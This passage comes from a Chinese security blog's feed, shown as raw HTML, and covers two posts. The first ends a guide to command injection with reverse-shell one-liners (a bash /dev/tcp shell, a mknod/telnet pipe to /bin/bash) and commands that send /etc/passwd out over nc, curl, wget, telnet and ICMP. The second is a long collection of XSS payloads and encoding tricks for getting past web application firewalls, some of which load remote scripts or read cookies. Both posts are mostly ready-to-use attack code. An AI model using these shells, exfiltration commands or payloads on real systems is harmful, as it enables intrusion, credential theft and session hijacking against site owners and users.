class="line">mknod backpipe p &amp;&amp; telnet ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure><h3 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h3><p>无空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -c 4 8.8.8.8;hostname|&#123;nc,ip,port&#125;</span><br></pre></td></tr></table></figure><p>使用nc将文件重定向</p><p>靶机上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp port &lt; /etc/passwd</span><br></pre></td></tr></table></figure><p>本机直接nc ip port得到文件内容</p><p>使用http协议，通过curl：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://ip:port -F a=@/etc/passwd</span><br></pre></td></tr></table></figure><p>同样可以通过curl使用ftp协议，同理wget、telnet当然也是可以的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget --post-data=&quot;`cat /etc/passwd`&quot; http://ip:port</span><br><span class="line"></span><br><span class="line">wget --post-file=/etc/passwd http://ip:port</span><br><span class="line"></span><br><span class="line">telnet 106.14.153.173 2015 &lt; /etc/passwd</span><br></pre></td></tr></table></figure><p>使用ICMP报文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat password.txt | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 xxx.xxx.xxx.xxx; done</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;不过无论怎么玩，还是直接弹回一个&lt;code&gt;shell&lt;/code&gt;来最实用，于是可以有&lt;/p&gt;
&lt;p&gt;basn方式&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;bash -c &amp;quot;sh &amp;gt;&amp;amp; /dev/tcp/your ip/port 0&amp;gt;&amp;amp;1&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>XSS现代WAF规则探测及绕过技术</title>
    <link href="http://www.7wawa.com/2019/01/09/XSS%E7%8E%B0%E4%BB%A3WAF%E8%A7%84%E5%88%99%E6%8E%A2%E6%B5%8B%E5%8F%8A%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/"/>
    <id>http://www.7wawa.com/2019/01/09/XSS%E7%8E%B0%E4%BB%A3WAF%E8%A7%84%E5%88%99%E6%8E%A2%E6%B5%8B%E5%8F%8A%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/</id>
    <published>2019-01-09T03:11:43.000Z</published>
    <updated>2019-01-09T07:13:45.138Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XSS现代WAF规则探测及绕过技术"><a href="#XSS现代WAF规则探测及绕过技术" class="headerlink" title="XSS现代WAF规则探测及绕过技术"></a>XSS现代WAF规则探测及绕过技术</h2><h2 id="初始测试"><a href="#初始测试" class="headerlink" title="初始测试"></a><strong>初始测试</strong></h2><p>1、使用无害的payload，类似<b>,<i>,<u>观察响应，判断应用程序是否被HTML编码，是否标签被过滤，是否过滤&lt;&gt;等等；</u></i></b></p><p>2、如果过滤闭合标签，尝试无闭合标签的payload（&lt;b,&lt;i,&lt;marquee）观察响应；</p><a id="more"></a><p>3、尝试以下的payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>);&lt;/script&gt;</span><br><span class="line">&lt;script&gt;prompt(<span class="number">1</span>);&lt;/script&gt;</span><br><span class="line">&lt;script&gt;confirm      (<span class="number">1</span>);&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"http://rhainfosec.com/evil.js"</span>&gt;</span><br></pre></td></tr></table></figure><p>判断是否触发过滤规则，尝试使用大小写混合字符</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scRiPt&gt;alert(<span class="number">1</span>);&lt;/scrIPt&gt;</span><br></pre></td></tr></table></figure><p>1、如果大小写不行的话，<script>被过滤尝试&lt;scr<script>ipt&gt;alert(1)&lt;/scr<script>ipt&gt;；</p><p>2、使用<a>标签测试</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a  href=“http:<span class="comment">//www.google.com"&gt;Clickme&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p>&lt;a被过滤？</p><p>href被过滤？</p><p>其他内容被过滤？</p><p>如果没有过滤尝试使用<a href=”javascript:alert(1)”>Clickme</a></p><p>尝试使用错误的事件查看过滤<a href=”rhainfosec.com” onclimbatree=alert(1)>ClickHere</a></p><p>HTML5拥有150个事件处理函数，可以多尝试其他函数&lt;body/onhashchange=alert(1)&gt;<a href=#>clickit</p><h2 id="测试其他标签"><a href="#测试其他标签" class="headerlink" title="测试其他标签"></a>测试其他标签</h2><p>src属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x      onerror=prompt(<span class="number">1</span>);&gt;</span><br><span class="line">&lt;img/src=aaa.jpg      onerror=prompt(<span class="number">1</span>);</span><br><span class="line">&lt;video src=x      onerror=prompt(<span class="number">1</span>);&gt;</span><br><span class="line">&lt;audio src=x      onerror=prompt(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure><p>iframe</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframesrc=<span class="string">"javascript:alert(2)"</span>&gt;</span><br><span class="line">&lt;iframe/src=<span class="string">"data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="</span>&gt;</span><br></pre></td></tr></table></figure><p>Embed</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed/src=<span class="comment">//goo.gl/nlX0P&gt;</span></span><br></pre></td></tr></table></figure><p>Action</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"Javascript:alert(1)"</span>&gt;&lt;input type=submit&gt;</span><br><span class="line">&lt;isindex action="javascript:alert(1)" type=image&gt;</span><br><span class="line">&lt;isindex action=j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(1) type=image&gt;</span><br><span class="line">&lt;isindex action=data:text/html, type=image&gt;</span><br></pre></td></tr></table></figure><p>mario验证</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;formaction=&amp;#039;data:text&amp;sol;html,&amp;lt;script&amp;gt;alert(1)&amp;lt/script&amp;gt&amp;#039;&gt;&lt;button&gt;CLICK</span><br></pre></td></tr></table></figure><p>“formaction”属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;isindexformaction=<span class="string">"javascript:alert(1)"</span>      type=image&gt;</span><br><span class="line">&lt;input type=<span class="string">"image"</span> formaction=JaVaScript:alert(<span class="number">0</span>)&gt;</span><br><span class="line">&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME</span><br></pre></td></tr></table></figure><p>“background”属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=javascript:alert(<span class="number">1</span>)&gt;&lt;/table&gt; <span class="comment">// Works on Opera 10.5      and IE6</span></span><br></pre></td></tr></table></figure><p>“posters” 属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video poster=javascript:alert(<span class="number">1</span>)<span class="comment">//&gt;&lt;/video&gt; // Works Upto Opera 10.5</span></span><br></pre></td></tr></table></figure><p>“data”属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;object data=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="</span>&gt;</span><br><span class="line">&lt;object/data=<span class="comment">//goo.gl/nlX0P?</span></span><br></pre></td></tr></table></figure><p>“code”属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;applet code=<span class="string">"javascript:confirm(document.cookie);"</span>&gt; <span class="comment">// Firefox Only</span></span><br><span class="line">&lt;embed  code=<span class="string">"http://businessinfo.co.uk/labs/xss/xss.swf"</span>      allowscriptaccess=always&gt;</span><br></pre></td></tr></table></figure><p>事件处理</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=prompt(<span class="number">1</span>);&gt;</span><br><span class="line">&lt;marquee/onstart=confirm(<span class="number">2</span>)&gt;<span class="regexp">/</span></span><br><span class="line"><span class="regexp">&lt;body onload=prompt(1);&gt;</span></span><br><span class="line"><span class="regexp">&lt;select autofocus onfocus=alert(1)&gt;</span></span><br><span class="line"><span class="regexp">&lt;textarea autofocus onfocus=alert(1)&gt;</span></span><br><span class="line"><span class="regexp">&lt;keygen autofocus onfocus=alert(1)&gt;</span></span><br><span class="line"><span class="regexp">&lt;video&gt;&lt;source onerror="javascript:alert(1)"&gt;</span></span><br></pre></td></tr></table></figure><p>短payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;q/oncut=open()&gt;</span><br><span class="line">&lt;q/oncut=alert(<span class="number">1</span>)&gt; <span class="comment">//      Useful in-case of payload restrictions.</span></span><br></pre></td></tr></table></figure><p>嵌套欺骗</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;marquee&lt;marquee/onstart=confirm(<span class="number">2</span>)&gt;<span class="regexp">/onstart=confirm(1)&gt;</span></span><br><span class="line"><span class="regexp">&lt;body  language=vbsonload=alert-1 /</span><span class="regexp">/ Works with IE8</span></span><br><span class="line"><span class="regexp">&lt;command onmouseover="\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x63\x6F\x6E\x66\x6    9\x72\x6D\x26\x6C\x70\x61\x72\x3B\x31\x26\x72\x70\x61\x72\x3B"&gt;Save&lt;/</span>command&gt;      <span class="comment">// Works with IE8</span></span><br></pre></td></tr></table></figure><p>圆括号被过滤</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a onmouseover=<span class="string">"javascript:window.onerror=alert;throw 1&gt;</span></span><br><span class="line"><span class="string">&lt;img src=x onerror="</span>javascript:<span class="built_in">window</span>.onerror=alert;<span class="keyword">throw</span> <span class="number">1</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">&lt;body/onload=javascript:window.onerror=eval;throw&amp;#039;=alert\x281\x29&amp;#039;;</span></span><br></pre></td></tr></table></figure><p>Expression 属性</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img style=<span class="string">"xss:expression(alert(0))"</span>&gt; <span class="comment">// Works upto IE7.</span></span><br><span class="line">&lt;div style=<span class="string">"color:rgb(&amp;#039;&amp;#039;x:expression(alert(1))"</span>&gt;&lt;/div&gt;      <span class="comment">// Works upto IE7.</span></span><br><span class="line">&lt;style&gt;#test&#123;x:expression(alert(/XSS/))&#125;&lt;/style&gt;      // Works upto IE7</span><br></pre></td></tr></table></figure><p>“location”属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a onmouseover=location=’javascript:alert(<span class="number">1</span>)&gt;click</span><br><span class="line">&lt;body onfocus=<span class="string">"location=&amp;#039;javascrpt:alert(1) &gt;123</span></span><br></pre></td></tr></table></figure><p>其他Payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"refresh"</span>      content=<span class="string">"0;url=//goo.gl/nlX0P"</span>&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"refresh"</span>      content=<span class="string">"0;javascript&amp;colon;alert(1)"</span>/&gt;</span><br><span class="line">&lt;svg xmlns=<span class="string">"http://www.w3.org/2000/svg"</span>&gt;&lt;g      onload="javascript:\u0061lert(1);"&gt;&lt;/g&gt;&lt;/svg&gt; <span class="comment">//      By @secalert</span></span><br><span class="line">&lt;svg xmlns:xlink=<span class="string">" r=100 /&gt;&lt;animate attributeName="</span>xlink:href<span class="string">"      values="</span>;javascript:alert(<span class="number">1</span>)<span class="string">" begin="</span><span class="number">0</span>s<span class="string">"      dur="</span><span class="number">0.1</span>s<span class="string">" fill="</span>freeze<span class="string">"/&gt; // By Mario</span></span><br><span class="line"><span class="string">&lt;svg&gt;&lt;![CDATA[&gt;&lt;imagexlink:href="</span>]]&gt;&lt;img/src=xx:xonerror=alert(2)//"&lt;/svg&gt;      <span class="comment">// By @secalert</span></span><br><span class="line">&lt;meta content=<span class="string">"&amp;NewLine; 1 &amp;NewLine;;JAVASCRIPT&amp;colon; alert(1)"</span> http-equiv=<span class="string">"refresh"</span>/&gt;</span><br><span class="line">&lt;math&gt;&lt;a xlink:href="//jsfiddle.net/t846h/"&gt;click // By Ashar Javed</span><br></pre></td></tr></table></figure><p>（）；：被过滤</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt;      <span class="comment">// Works With All Browsers</span></span><br><span class="line">( is html encoded to &amp;#40</span><br><span class="line">) is html encoded to &amp;#41</span><br></pre></td></tr></table></figure><p>Opera的变量</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40      1&amp;#41 // Works with Opera Only</span><br></pre></td></tr></table></figure><p><strong>实体解码</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt;<span class="regexp">/script&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/</span>script&amp;gt;</span><br><span class="line">&lt;a  href=<span class="string">"j&amp;#x26;#x26#x41;vascript:alert%252831337%2529"</span>&gt;Hello&lt;<span class="regexp">/a&gt;</span></span><br></pre></td></tr></table></figure><p>编码</p><p>JavaScript是很灵活的语言，可以使用十六进制、Unicode、HTML等进行编码，以下属性可以被编码（支持HTML, Octal, Decimal,Hexadecimal, and Unicode）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">href=</span><br><span class="line">action=</span><br><span class="line">formaction=</span><br><span class="line">location=</span><br><span class="line">on*=</span><br><span class="line">name=</span><br><span class="line">background=</span><br><span class="line">poster=</span><br><span class="line">src=</span><br><span class="line">code=</span><br><span class="line">data= <span class="comment">//只支持base64</span></span><br></pre></td></tr></table></figure><p><strong>基于上下文的过滤</strong></p><p>WAF最大的问题是不能理解内容，使用黑名单可以阻挡独立的js脚本，但仍不能对xss提供足够的保护，如果一个反射型的XSS是下面这种形式</p><p><strong>输入反射属性</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input value=<span class="string">"XSStest"</span> type=text&gt;</span><br></pre></td></tr></table></figure><p>我们可以使用 “&gt;&lt;imgsrc=x  onerror=prompt(0);&gt;触发，但是如果&lt;&gt;被过滤，我们仍然可以使用“ autofocusonfocus=alert(1)//触发，基本是使用“ 关闭value属性，再加入我们的执行脚本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">" onmouseover="</span>prompt(<span class="number">0</span>) x=<span class="string">"</span></span><br><span class="line"><span class="string">"</span> onfocusin=alert(<span class="number">1</span>)     autofocus x=<span class="string">"</span></span><br><span class="line"><span class="string">"</span> onfocusout=alert(<span class="number">1</span>)     autofocus x=<span class="string">"</span></span><br><span class="line"><span class="string">"</span> onblur=alert(<span class="number">1</span>) autofocus     a=<span class="string">"</span></span><br></pre></td></tr></table></figure><p>输入反射在<script>标签内</p><p>类似这种情况：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">Var</span><br><span class="line">x=”Input”;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>通常，我们使用“&gt;</script>,闭合前面的标签，然而在这种情况，我们也可以直接输入执行脚本alert(), prompt()confirm() ，例如：</p><p>“;alert(1)//</p><p><strong>非常规事件监听</strong></p><p>DOMfocusin,DOMfocusout,等事件，这些需要特定的事件监听适当的执行。例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">";document.body.addEventListener("</span>DOMActivate<span class="string">",alert(1))//</span></span><br><span class="line"><span class="string">"</span>;<span class="built_in">document</span>.body.addEventListener(<span class="string">"DOMActivate"</span>,prompt(<span class="number">1</span>))<span class="comment">//</span></span><br><span class="line"><span class="string">";document.body.addEventListener("</span>DOMActivate<span class="string">",confirm(1))//</span></span><br></pre></td></tr></table></figure><p>此类事件的列表</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DOMAttrModified</span><br><span class="line">DOMCharacterDataModified</span><br><span class="line">DOMFocusIn</span><br><span class="line">DOMFocusOut</span><br><span class="line">DOMMouseScroll</span><br><span class="line">DOMNodeInserted</span><br><span class="line">DOMNodeInsertedIntoDocument</span><br><span class="line">DOMNodeRemoved</span><br><span class="line">DOMNodeRemovedFromDocument</span><br><span class="line">DOMSubtreeModified</span><br></pre></td></tr></table></figure><p><strong>超文本内容</strong></p><p>代码中的情况如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a</span><br><span class="line">href=”Userinput”&gt;Click&lt;<span class="regexp">/a&gt;</span></span><br></pre></td></tr></table></figure><p>可以使用javascript:alert(1)//直接执行&lt;ahref=”javascript:alert(1)//”&gt;Click</p><p><strong>变形</strong></p><p>主要包含大小写和</p><p>JavaScript变形</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">javascript&amp;#058;alert(1)</span><br><span class="line">javaSCRIPT&amp;colon;alert(<span class="number">1</span>)</span><br><span class="line">JaVaScRipT:alert(<span class="number">1</span>)</span><br><span class="line">javas&amp;Tab;cript:\u0061lert(<span class="number">1</span>);</span><br><span class="line">javascript:\u0061lert&amp;#x28;1&amp;#x29</span><br><span class="line">javascript&amp;#x3A;alert&amp;lpar;document&amp;period;cookie&amp;rpar;      // AsharJaved</span><br></pre></td></tr></table></figure><p>IE10以下和URI中可以使用VBScript</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vbscript:alert(<span class="number">1</span>);</span><br><span class="line">vbscript&amp;#058;alert(1);</span><br><span class="line">vbscr&amp;Tab;ipt:alert(<span class="number">1</span>)<span class="string">"</span></span><br></pre></td></tr></table></figure><p>Data URl</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</span><br></pre></td></tr></table></figure><p><strong>JSON内容</strong></p><p>反射输入</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encodeURIComponent(&amp;#039;userinput&amp;#039;)</span><br></pre></td></tr></table></figure><p>可以使用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-alert(<span class="number">1</span>)-</span><br><span class="line">-prompt(<span class="number">1</span>)-</span><br><span class="line">-confirm(<span class="number">1</span>)-</span><br></pre></td></tr></table></figure><p><strong>结果</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encodeURIComponent(&amp;#039;&amp;#039;-alert(1)-&amp;#039;&amp;#039;)</span><br><span class="line">encodeURIComponent(&amp;#039;&amp;#039;-prompt(1)-&amp;#039;&amp;#039;)</span><br></pre></td></tr></table></figure><p><strong>输入反射在svg标签内</strong></p><p>源码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;varmyvar=”YourInput”;&lt;/script&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure><p>可以输入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.site.com/test.php?<span class="keyword">var</span>=text”;alert(<span class="number">1</span>)<span class="comment">//</span></span><br></pre></td></tr></table></figure><p>如果系统编码了”字符</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;varmyvar="text&amp;quot;;alert(1)//";&lt;/script&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure><p>原因是引入了附加的（XML）到HTML内容里，可以使用2次编码处理</p><h2 id="浏览器BUG"><a href="#浏览器BUG" class="headerlink" title="浏览器BUG"></a>浏览器BUG</h2><p><strong>字符集BUG</strong></p><p>字符集BUG在IE中很普遍，最早的bug是UTF-7。如果能控制字符集编码，我们可以绕过99% 的WAF过滤。</p><p>示例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v=XSS</span></span><br></pre></td></tr></table></figure><p>可以控制编码，提交</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v=”&gt;&lt;img</span></span><br><span class="line">src=x onerror=prompt(<span class="number">0</span>);&gt;</span><br></pre></td></tr></table></figure><p>可以修改为UTF-32编码形式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">∀㸀㰀script㸀alert(<span class="number">1</span>)㰀/script㸀</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//xsst.sinaapp.com/utf-32-1.php?charset=utf-32&amp;v=%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80</span></span><br></pre></td></tr></table></figure><p><strong>空字节</strong></p><p>最长用来绕过mod_security防火墙，形式如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;scri%<span class="number">00</span>pt&gt;alert(<span class="number">1</span>);&lt;/scri%00pt&gt;</span><br><span class="line"></span><br><span class="line">&lt;scri\x00pt&gt;alert(1);&lt;/scri%00pt&gt;</span><br><span class="line">&lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;/s%00c%00r%00%00ip%00t&gt;</span><br></pre></td></tr></table></figure><p>空字节只适用于PHP 5.3.8以上的版本</p><p><strong>语法BUG</strong></p><p>RFC声明中节点名称不能是空格，以下的形式在javascript中不能运行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>);&lt;/script&gt;</span><br><span class="line">&lt;%<span class="number">0</span>ascript&gt;alert(<span class="number">1</span>);&lt;/script&gt;</span><br><span class="line">&lt;%<span class="number">0</span>bscript&gt;alert(<span class="number">1</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&lt;%, &lt;//, &lt;!,&lt;?可以被解析成&lt;，所以可以使用以下的payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="comment">//     style=x:expression\28write(1)\29&gt; // Works upto IE7</span></span><br></pre></td></tr></table></figure><p>参考<a href="http://html5sec.org/#71" target="_blank" rel="noopener">http://html5sec.org/#71</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--[<span class="keyword">if</span>]&gt;&lt;script&gt;alert(1)&lt;/script     --&gt; // Works upto IE9</span><br></pre></td></tr></table></figure><p>参考<a href="http://html5sec.org/#115" target="_blank" rel="noopener">http://html5sec.org/#115</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml-stylesheet     type=<span class="string">"text/css"</span>?&gt;&lt;root     style="x:expression(write(1))"/&gt; // Works in IE7</span><br></pre></td></tr></table></figure><p>参考 <a href="http://html5sec.org/#77" target="_blank" rel="noopener">http://html5sec.org/#77</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%div%<span class="number">20</span>style=xss:expression(prompt(<span class="number">1</span>))&gt;     <span class="comment">// Works Upto IE7</span></span><br></pre></td></tr></table></figure><p><strong>Unicode分隔符</strong></p><p>[on\w+\s*]这个规则过滤了所有on事件，为了验证每个浏览器中有效的分隔符，可以使用fuzzing方法测试0×00到0xff，结果如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">IExplorer=     [<span class="number">0x09</span>,<span class="number">0x0B</span>,<span class="number">0x0C</span>,<span class="number">0x20</span>,<span class="number">0x3B</span>]</span><br><span class="line">Chrome =     [<span class="number">0x09</span>,<span class="number">0x20</span>,<span class="number">0x28</span>,<span class="number">0x2C</span>,<span class="number">0x3B</span>]</span><br><span class="line">Safari = [<span class="number">0x2C</span>,<span class="number">0x3B</span>]</span><br><span class="line">FireFox=     [<span class="number">0x09</span>,<span class="number">0x20</span>,<span class="number">0x28</span>,<span class="number">0x2C</span>,<span class="number">0x3B</span>]</span><br><span class="line">Opera = [<span class="number">0x09</span>,<span class="number">0x20</span>,<span class="number">0x2C</span>,<span class="number">0x3B</span>]</span><br><span class="line">Android =     [<span class="number">0x09</span>,<span class="number">0x20</span>,<span 